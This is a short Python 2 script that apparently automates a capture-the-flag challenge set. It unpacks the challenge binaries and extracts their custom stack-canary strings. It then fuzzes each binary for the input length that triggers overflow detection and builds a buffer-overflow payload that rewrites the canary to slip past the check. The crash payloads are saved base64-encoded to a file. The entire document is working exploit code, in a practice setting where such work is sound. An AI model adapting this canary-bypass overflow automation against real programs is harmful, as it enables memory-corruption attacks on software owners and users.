#!/usr/bin/python

from subprocess import PIPE, Popen, check_output, call
import glob
import base64

print "[*] Extracting challenges..."
[call(['tar','xf',c]) for c in ['1000_cuts.tar.bz2','334_cuts.tar.bz2','666_cuts.tar.bz2']]

print "[*] Loading all canaries..."
canaries = {}
for r in check_output(["strings -f -n 8 334_cuts/easy* 666_cuts/* 1000_cuts/* | grep -Ev 'hacking|canary|clang|shstrtab|comment'"], shell=True).splitlines():
    fname, canary = r.split(': ')
    canaries[fname] = [canary]
print "[*] Loaded canaries for",len(canaries),"files"

dbout = open('hakdb.txt','w') # save them for later
print "[*] Fuzzing all files..."
for k in canaries:
    if 'xml' in k:
        continue
    print "[*] Fuzzing",k
    for i in range(8,200):
        p = Popen(['./'+k],stdout=PIPE,stdin=PIPE)
        stdout = p.communicate(('A' * i) + "\n")[0]
        if 'hacking' in stdout:
            print "[*] Hacking detected at len",i
            canaries[k].append(i)
            cbytes = canaries[k][0][:4]
            payload = "A" * i
            payload += cbytes
            payload += "C\n"
            p = Popen(['./'+k],stdout=PIPE,stdin=PIPE)
            stdout = p.communicate(payload)[0]
            if 'canary' in stdout:
                print "[*] Canary bypassed with payload ",i,cbytes
                crashpayload = base64.b64encode(payload[:-1] + "D" * 34 + "\n")
                canaries[k].append(crashpayload)
                dbout.write(k+":"+repr(canaries[k])+"\n")
            break
dbout.close()    
print "[*] Data written to hakdb.txt"
